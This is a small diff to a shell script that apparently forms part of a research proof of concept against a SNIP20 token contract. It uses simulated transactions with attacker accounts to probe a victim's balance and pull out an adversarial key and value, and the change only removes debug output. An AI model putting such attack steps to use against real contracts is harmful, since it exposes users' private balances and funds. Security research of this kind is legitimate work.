@@ -167,8 +167,6 @@ cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
 cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
 
 simulate_tx snip20_boost_1
-res3=$(cat $BACKUP/simulate_result)
-#echo $res3
 
 # probe victim balance
 amount=$(bc <<< "2^128 - 1")
@@ -176,13 +174,11 @@ generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
 simulate_tx snip20_getkey
-res4=$(cat $BACKUP/simulate_result)
-#echo $res4
+
 tag=$(sed '3q;d' $BACKUP/kv_store)
 key=${tag:6:-1}
 tag=$(sed '4q;d' $BACKUP/kv_store)
 value=${tag:8:-1}
-
 echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
 
